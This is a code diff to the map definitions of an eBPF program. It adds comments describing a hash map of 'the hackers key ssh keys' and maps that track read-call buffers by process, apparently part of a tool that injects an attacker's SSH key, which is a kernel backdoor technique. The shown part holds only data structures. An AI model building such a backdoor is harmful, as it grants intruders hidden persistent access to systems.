@@ -1,11 +1,13 @@
 #include "./common.h"
 #ifndef __MAPS__
 #define __MAPS__
+
+// Map to hold the hackers key ssh keys.
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, size_t);
-    __type(value, char[4096]);
+    __type(key, size_t );               // key is id
+    __type(value, char* );              // value is ssh pub key
 } map_payload_buffer SEC(".maps");
 
 // Ringbuffer Map to pass messages from kernel to user
@@ -18,16 +20,16 @@ struct {
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, size_t);
-    __type(value, unsigned int);
+    __type(key, size_t);                // key is pid_tgid
+    __type(value, unsigned int);        // value are always zero.
 } map_fds SEC(".maps");
 
 // Map to fold the buffer sized from 'read' calls
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, size_t);
-    __type(value, long unsigned int);
+    __type(key, size_t);                // key is pid_tgid
+    __type(value, long unsigned int);   // char buffer pointer location
 } map_buff_addrs SEC(".maps");
 
 // Report Events
